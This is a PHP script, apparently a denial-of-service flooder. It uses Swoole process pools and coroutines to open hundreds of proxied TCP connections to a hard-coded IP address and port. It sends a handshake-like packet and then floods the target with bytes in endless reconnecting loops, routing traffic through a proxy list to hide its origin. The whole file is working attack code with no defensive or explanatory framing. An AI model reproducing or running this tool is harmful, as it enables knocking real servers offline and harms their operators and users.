<?php
$target = "222.186.174.9";
$port = 50237;
$max_parallel = 200;
$worker = 10;
$pool = new \Swoole\Process\Pool($worker,0,0,true);
$proxy = preg_split("/\s{1,2}/",file_get_contents("./proxy.txt"));
$pool->on("workerStart",function ($p,$id) use ($target, $port, $max_parallel, $proxy){
        print_r("Worker {$id} started.".PHP_EOL);
        $p_count = 0;
        $p = count($proxy) - 1;
        while(true){
                if($p_count >= $max_parallel){
                        Co::sleep(0.01);
                        continue;
                }
                $np = preg_split("/:/",$proxy[rand(0,$p)]);
                go(function() use ($target, $port, &$p_count, $id, $np) {
                        if(!isset($np[1])){return;}
                        $n = ++$p_count;
                        $dat = "\x00\x04".pack('c', StrLen($target)) . $target . Pack('n', $port) . "\x01";
                        $dat = pack('c', strlen($dat)) . $dat;
                        try{
                                $q = new \Co\Client(SWOOLE_SOCK_TCP);
                                $q->set([
                                        'http_proxy_host' => $np[0],
                                        'http_proxy_port' => $np[1]
                                ]);
                                print_r("Coro {$id}:{$n} through {$np[0]}:{$np[1]} ready.".PHP_EOL);
                                Co::sleep(0.01);
                                while(true){
                                        $q->connect($target,$port);
                                        $q->send($dat);
                                        while($q->send("\x01\x00")!==false){
                                                Co::sleep(0.01);
                                        }

                                        $q->close();
                                }
                        } catch(Exception $e) {
                                print_r("Coro {$id}:{$n} error.".PHP_EOL.$e->getMessage().PHP_EOL);
                        } finally {
                                $p_count--;
                        }
                });
        }
});

$pool->start();
